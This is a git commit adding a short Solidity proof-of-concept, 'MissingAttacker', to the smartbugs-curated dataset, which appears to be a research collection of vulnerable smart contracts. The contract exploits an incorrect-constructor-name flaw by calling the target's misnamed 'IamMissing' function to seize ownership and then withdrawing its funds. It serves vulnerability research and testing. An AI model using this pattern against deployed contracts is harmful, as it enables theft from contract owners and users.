ca35e86095ce72198ef042ad2fba0887b2f3c86b
Monica Jin <monicachenjin@gmail.com>
2024-07-22 15:56:29 +0100

    add: incorrect contructor name 1 exploit

---
+++ smartbugs-curated/0.4.x/contracts/access_control/incorrect_constructor_name1_attack.sol
@@ -0,0 +1,24 @@
+ pragma solidity ^0.4.15;
+
+ import "../dataset/access_control/incorrect_constructor_name1.sol";
+
+ contract MissingAttacker{
+    
+    Missing target;
+
+    constructor(address _target) public {
+        target = Missing(_target);
+    }
+
+    function attack() public {
+        target.IamMissing();
+    }
+
+    function test() public {
+        target.withdraw();
+    }
+
+    function () public payable {
+    }
+
+ }
